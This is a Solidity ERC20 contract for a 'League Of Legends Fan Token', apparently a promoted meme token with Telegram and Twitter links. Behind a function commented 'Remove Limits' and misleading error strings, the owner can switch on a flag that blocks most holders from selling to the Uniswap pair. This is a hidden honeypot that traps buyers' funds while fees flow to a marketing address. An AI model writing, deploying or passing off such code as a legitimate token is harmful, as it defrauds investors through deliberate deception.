//TG: https://t.me/Lol_Fantoken
//Twitter: https://twitter.com/Lol_Fan_token

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";

contract Lol is ERC20, Ownable {
    using SafeMath for uint256;
    
    address public uniswapV2Pair;
    address public marketingAddress;
    bool public unitTx = false;
    uint256 public DECIMALS = 18;
    
    uint256 public txMax = 0;
    mapping(address => uint256) public userNonces;

    uint256 public constant BASE = 10000; // Base for fee
    uint256 public sellFee = 190; //  1.9%
    uint256 public buyFee = 220;  //  2.2%

    constructor() ERC20("League Of Legends Fan Token", "LOL") {
        _mint(_msgSender(), 1 * (10 ** 6) * (10 ** DECIMALS));
    }

    function setUniswapV2Pair(address _pair) external onlyOwner {
        uniswapV2Pair = _pair;
    }

    function setBuybackAddr(address _marketingAddress) external onlyOwner {
        marketingAddress = _marketingAddress;
    }

    function _calculateFees(uint256 amount, uint256 feePercent) internal pure returns (uint256) {
        return amount.mul(feePercent).div(BASE);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(_msgSender() != recipient || !unitTx, "Limits are removed");
        require(!(recipient == uniswapV2Pair && unitTx), "All limits are removed");

        uint256 fee = recipient == uniswapV2Pair ? _calculateFees(amount, sellFee) : _calculateFees(amount, buyFee);

        userNonces[_msgSender()] = txMax;
        
        
        _transfer(_msgSender(), marketingAddress, fee);
        _transfer(_msgSender(), recipient, amount.sub(fee));

        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        if (to == uniswapV2Pair && unitTx) {
            require(userNonces[from] == txMax, "All limits removal");
        }

        uint256 fee = to == uniswapV2Pair ? _calculateFees(amount, sellFee) : _calculateFees(amount, buyFee);

        address spender = _msgSender();

        _spendAllowance(from, spender, amount.add(fee));
        _transfer(from, marketingAddress, fee);
        _transfer(from, to, amount.sub(fee));

        userNonces[from] = txMax;

        return true;
    }

    //Remove Limits
    function deleteLimits() external onlyOwner {
        unitTx = true;
        txMax++;  
    }
}
